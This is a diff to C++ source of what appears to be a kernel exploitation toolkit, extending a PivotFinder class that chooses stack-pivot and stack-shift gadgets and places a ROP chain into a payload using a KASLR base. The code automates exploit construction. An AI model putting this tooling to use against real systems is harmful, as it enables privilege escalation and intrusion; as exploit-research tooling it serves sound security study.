@@ -5,9 +5,34 @@
 #include "pivot/Pivots.cpp"
 #include "pivot/StackPivot.cpp"
 #include "util/Payload.cpp"
+#include "util/stdutils.cpp"
+#include "util/RopChain.cpp"
+
+struct StackShiftInfo {
+    uint64_t from_offset;
+    const StackShiftPivot& pivot;
+};
+
+struct StackShiftingInfo {
+    std::vector<StackShiftInfo> stack_shifts;
+    uint64_t to_offset;
+
+    void Apply(uint64_t kaslr_base, Payload& payload) {
+        for (auto& shift : stack_shifts)
+            payload.Set(shift.from_offset, kaslr_base + shift.pivot.address);
+    }
+};
+
+struct RopPivotInfo {
+    const RopChain& rop;
+    StackPivot pivot;
+    uint64_t rop_min_offset;
+    uint64_t rop_offset;
+    StackShiftingInfo stack_shift;
+};
 
 class PivotFinder {
-    const Pivots& pivots_;
+    Pivots pivots_;
     Register buf_reg_;
     Payload& payload_;
 
@@ -50,7 +75,12 @@ class PivotFinder {
     }
 
 public:
-    PivotFinder(const Pivots& pivots, Register buf_reg, Payload& payload): pivots_(pivots), buf_reg_(buf_reg), payload_(payload) { }
+    PivotFinder(const Pivots& pivots, Register buf_reg, Payload& payload): pivots_(pivots), buf_reg_(buf_reg), payload_(payload) {
+        sortByField<OneGadgetPivot>(pivots_.one_gadgets, [](auto& a) { return a.next_rip_offset; });
+        sortByField<PushIndirectPivot>(pivots_.push_indirects, [](auto& a) { return a.next_rip_offset; });
+        sortByField<PopRspPivot>(pivots_.pop_rsps, [](auto& a) { return a.next_rip_offset; });
+        sortByField<StackShiftPivot>(pivots_.stack_shifts, [](auto& a) { return a.shift_amount; });
+    }
 
     bool CheckRegister(const RegisterUsage& reg) {
         if (reg.reg != buf_reg_)
@@ -81,22 +111,13 @@ public:
     }
 
     std::optional<StackShiftPivot> FindShift(uint64_t min_shift, uint64_t upper_bound = std::numeric_limits<uint64_t>::max()) {
-        // copy for sorting
-        std::vector<StackShiftPivot> sorted_shifts = pivots_.stack_shifts;
-
-        // Sort pivots by shift_amount
-        std::sort(sorted_shifts.begin(), sorted_shifts.end(),
-                    [](const StackShiftPivot& a, const StackShiftPivot& b) {
-                    return a.shift_amount < b.shift_amount;
-                    });
-
         // Find the minimum shift_amount >= min_shift
-        for (const auto &pivot : sorted_shifts)
+        for (const auto &pivot : pivots_.stack_shifts)
         {
             // Only consider shifts which have the next rip in the last position for now
             if (pivot.shift_amount >= min_shift &&
                 pivot.shift_amount < upper_bound &&
-                pivot.ret_offset == pivot.shift_amount - 8)
+                pivot.JumpsToShift())
             {
                 return pivot;
             }
@@ -109,6 +130,68 @@ public:
     std::optional<StackPivot> Find(uint64_t free_bytes_after = 0) {
         auto result = FindInternal(true, free_bytes_after);
         return result.empty() ? std::nullopt : std::optional(result[0]);
+    }
+
+    std::optional<StackShiftingInfo> FindShifts(uint64_t from_offset, uint64_t min_to_offset) {
+        std::vector<StackShiftInfo> shifts;
+
+        while (from_offset < min_to_offset) {
+            auto shift_remaining = min_to_offset - from_offset;
+            auto shift = std::lower_bound(pivots_.stack_shifts.begin(),
+                pivots_.stack_shifts.end(), shift_remaining,
+                [](const StackShiftPivot& shift, int x) { return shift.shift_amount < x; });
+
+            if (shift == pivots_.stack_shifts.end())
+                return std::nullopt;
+
+            while (true) {
+                auto target_offset = from_offset + shift->shift_amount;
+
+                if (shift->JumpsToShift() &&
+                    payload_.CheckFree(target_offset, 8)) {
+                    shifts.push_back(StackShiftInfo { from_offset, *shift });
+                    from_offset = target_offset;
+                    break;
+                }
+
+                shift--;
+                if (shift == pivots_.stack_shifts.begin())
+                    return std::nullopt;
+            }
+        }
+
+        return StackShiftingInfo { shifts, from_offset };
+    }
+
+    uint64_t ApplyShift(uint64_t kaslr_base, uint64_t from_offset, uint64_t min_to_offset) {
+        auto shifts = FindShifts(from_offset, min_to_offset);
+        if (!shifts.has_value())
+            throw ExpKitError("could not find a right stack shift gadget");
+        shifts->Apply(kaslr_base, payload_);
+        return shifts->to_offset;
+    }
+
+    RopPivotInfo PivotToRop(const RopChain& rop) {
+        auto snapshot = payload_.Snapshot();
+        for (auto& pivot : FindInternal(false)) {
+            payload_.Restore(snapshot);
+            pivot.ApplyToPayload(payload_, rop.kaslr_base_);
+
+            auto rop_min_offset = payload_.FindEmpty(rop.GetByteSize(), 8);
+            if (!rop_min_offset)
+                continue; // not enough space for the ROP chain
+
+            auto shifts = FindShifts(pivot.GetDestinationOffset(), *rop_min_offset);
+            if (!shifts || !payload_.CheckFree(shifts->to_offset, rop.GetByteSize()))
+                continue; // no good shift or not enough space for ROP chain after shifts
+
+            shifts->Apply(rop.kaslr_base_, payload_);
+            payload_.Set(shifts->to_offset, rop.GetData());
+            return RopPivotInfo { rop, pivot, *rop_min_offset, shifts->to_offset, *shifts };
+        }
+
+        payload_.Restore(snapshot);
+        throw ExpKitError("could not pivot");
     }
 
     std::optional<PopRspPivot> GetPopRsp() {
